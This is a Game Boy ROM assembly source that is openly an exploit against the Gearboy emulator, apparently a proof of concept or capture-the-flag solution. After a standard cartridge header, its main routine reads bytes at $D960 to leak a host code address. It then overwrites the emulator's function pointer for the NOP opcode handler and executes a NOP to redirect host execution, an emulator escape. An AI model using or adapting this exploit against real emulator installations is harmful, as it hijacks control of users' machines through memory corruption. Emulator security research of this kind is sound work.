; Memory
.define VRAM   $8000 ; video memory
.define TILES  $8000 ; tile images
.define BGMAP0 $9800 ; first 32x32 tilemap
.define BGMAP1 $9C00 ; second 32x32 tilemap
.define WRAM   $C000 ; internal memory
.define OAM    $FE00 ; sprite memory
.define HRAM   $FF80 ; fast memory for LDH

.memoryMap
    defaultSlot 0
    slot 0 $0000 size $4000
    slot 1 $C000 size $4000
.endMe

.romBankSize   $4000
.romBanks      4
.ramSize       5 ; 64 KBytes (8 banks of 8KBytes each)
.cartridgeType 2 ; MBC1+RAM
.computeChecksum
.computeComplementCheck

;;;; GB ROM header
; GB header read by bootrom
.org $100
    nop
    jp   main

; Nintendo logo required for proper boot
.byte $CE,$ED,$66,$66,$CC,$0D,$00,$0B
.byte $03,$73,$00,$83,$00,$0C,$00,$0D
.byte $00,$08,$11,$1F,$88,$89,$00,$0E
.byte $DC,$CC,$6E,$E6,$DD,$DD,$D9,$99
.byte $BB,$BB,$67,$63,$6E,$0E,$EC,$CC
.byte $DD,$DC,$99,$9F,$BB,$B9,$33,$3E

.org $143
    .byte $C0 ; CGB
    ; u are a
    .byte $61

.org $200
main:
    ; Leak gearboy code address
    ld a, ($D960) ; opcode=FA
    ld ($C000), a
    ld a, ($D961)
    ld ($C001), a
    ld a, ($D962)
    ld ($C002), a
    ld a, ($D963)
    ld ($C003), a
    ld a, ($D964)
    ld ($C004), a
    ld a, ($D965)
    ld ($C005), a

    ; Overwrite function address of Processor::OPCode0x00
    ld a, 0xf0
    ld ($D960), a
    ld ($D961), a

    ; Redirect code execution
    nop           ; opcode=00
halt:
    jp halt
